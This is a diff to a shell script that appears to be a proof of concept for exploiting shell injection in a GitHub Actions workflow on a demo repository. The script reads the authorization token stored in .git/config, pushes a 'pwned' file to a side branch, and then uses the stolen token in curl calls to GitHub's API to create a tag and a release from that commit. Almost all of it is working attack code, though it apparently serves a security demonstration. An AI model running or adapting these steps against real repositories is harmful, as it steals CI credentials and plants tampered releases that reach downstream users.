@@ -2,26 +2,28 @@
 
 authfield=$(cat .git/config | grep AUTHORIZATION | cut -d':' -f 2)
 
-  
-# Inject content to a side branch
-curl --request PUT \
-  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/contents/pwned.txt \
-  --header "Authorization: $authfield" \
-  --header "Accept: application/vnd.github.v3+json" \
-  --data "{ \"message\": \"upload test artifact\", \"content\": \"$(echo pwned | openssl base64 | tr -d '\n')\", \"branch\": \"minusworld-gha-demo-patch-1\" }"
-  
-## STEP MISSING: GET COMMIT HASH OF BRANCH
+SIDE_BRANCH="side-branch"
+RELEASE="v1.0.4"
+
+# Create content in a side branch
+echo pwned > pwned.txt
+git checkout -b $SIDE_BRANCH
+git add pwned.txt
+git commit -m ""
+git push origin $SIDE_BRANCH
+
+commit_hash=$(git rev-parse HEAD)
   
 # Create a tag using the side branch
 curl --request POST \
   --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/git/refs \
   --header "Authorization: $authfield" \
   --header "Accept: application/vnd.github.v3+json" \
-  --data '{ "ref": "refs/tags/v1.0.3", "sha": "ddee5c447b6ec357415016945c367d072753b63b" }'
+  --data "{ \"ref\": \"refs/tags/$RELEASE\", \"sha\": \"$commit_hash\" }"
 
 # Create release
 curl --request POST \
   --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/releases \
   --header "Authorization: $authfield" \
   --header "Accept: application/vnd.github.v3+json" \
-  --data '{ "tag_name": "v1.0.3", "target_commitish": "ddee5c447b6ec357415016945c367d072753b63b" }'
+  --data "{ \"tag_name\": \"$RELEASE\", \"target_commitish\": \"$commit_hash\" }"
